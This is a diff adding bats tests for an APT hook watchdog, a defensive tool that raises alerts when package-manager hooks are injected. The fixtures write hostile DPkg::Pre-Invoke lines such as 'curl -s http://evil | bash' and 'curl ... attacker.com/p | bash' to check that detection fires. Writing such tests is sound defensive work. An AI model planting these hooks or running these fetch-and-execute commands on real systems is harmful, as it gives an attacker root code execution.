@@ -210,3 +210,59 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-apt-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): apt-hooks-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # T1546 package-transaction-triggered root code execution — injection
+    # alert MUST persist across runs until operator explicitly re-baselines.
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    printf 'DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"apt_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (current behavior — comment filter not implemented: // lines ARE scanned)" {
+    # apt.conf supports // line comments + /* ... */ block comments,
+    # but the current apt-hooks-watchdog scanner does NOT filter //
+    # lines from inventory — it pattern-matches raw content. Locks
+    # CURRENT behavior as documented; refinement opportunity to add
+    # comment-line filter is tracked separately (does NOT block this
+    # suite). Operator hypothetical-attack-pattern notes in // comments
+    # WILL trigger alert until refinement lands.
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n// DPkg::Pre-Invoke {"curl -s http://evil | bash";};\n' > "${HOOK}"
+    run_wd
+    # Current behavior: // line IS scanned + alert IS raised.
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: main apt.conf + apt.conf.d drop-in axis — injection in ANY watched file → alert)" {
+    # /etc/apt/apt.conf is the main config; /etc/apt/apt.conf.d/*.conf
+    # are drop-ins both honored by apt. Attacker may plant injection
+    # in EITHER. Lock multi-file axis.
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${APTCONF}"
+    printf 'DPkg::Post-Invoke {"/usr/bin/sync";};\n' > "${HOOK}"
+    APTCONF_F="${APTCONF}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in the MAIN apt.conf (NOT the drop-in).
+    printf 'DPkg::Pre-Invoke {"/tmp/.attacker";};\n' > "${APTCONF}"
+    APTCONF_F="${APTCONF}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (apt-shell-pipe-bash variant — bash subshell — also detected)" {
+    # apt | bash is a common bootstrap variant. Lock detection of
+    # the bash suffix in addition to sh.
+    printf 'DPkg::Post-Invoke {"/usr/bin/update-initramfs -u";};\n' > "${HOOK}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'DPkg::Pre-Invoke {"curl -s http://attacker.com/p | bash";};\n' > "${HOOK}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
